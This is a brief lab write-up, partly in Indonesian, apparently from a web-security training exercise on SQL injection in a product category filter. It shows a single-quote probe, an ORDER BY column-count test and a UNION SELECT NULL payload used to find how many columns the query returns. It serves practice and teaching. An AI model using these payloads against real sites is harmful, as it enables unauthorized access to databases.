# Overview
SQL Injection di Product Category Filter.

Hint :
- gunakan `union`
- cek berapa jumlah kolom dari query asli

Goals :
- determine jumlah kolom yang direturn dari sqli yang return additional row berisi null value

# Analisis
Cek apakah vuln terhadap sqli dengan `'`

Cek berapa jumlah kolom yang di return dari original query `' order by 1,2,3--`

payload:
```sql
' union select null,null,null--
```